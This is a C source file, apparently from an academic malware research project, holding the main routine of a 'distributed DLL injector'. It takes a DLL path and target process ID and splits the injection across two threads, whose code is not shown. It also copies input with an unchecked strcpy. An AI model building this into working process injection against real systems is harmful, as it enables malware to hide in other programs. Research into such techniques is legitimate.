/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* Include block */
#include<Windows.h>
#include<stdio.h>
#include<string.h>
#include "threads.h"
#include<stdlib.h>

/* constants */
#define MAX_TIME 1000

/* main */
int main(int argc,char *argv[])
{
	context ctx;
	HANDLE t1,t2;
	ctx.pid = atoi(argv[2]);
	strcpy(ctx.dll,argv[1]);

/* use mutex or busy wait */
#ifdef SYNC
	InitializeCriticalSection(&ctx.cs);
	InitializeConditionVariable(&ctx.cv1);
	InitializeConditionVariable(&ctx.cv2);
#else
	ctx.busy1=TRUE;
	ctx.busy2=FALSE;
#endif
	/* wait human to start */
	getchar();
	/* create injector threads */
	/* I developed two, but can be extended to more */
	t1=CreateThread(NULL,0,T1,&ctx,0,NULL);
	t2=CreateThread(NULL,0,T2,&ctx,0,NULL);
	WaitForSingleObject(t1,MAX_TIME);
	WaitForSingleObject(t2,MAX_TIME);
	return 0;
}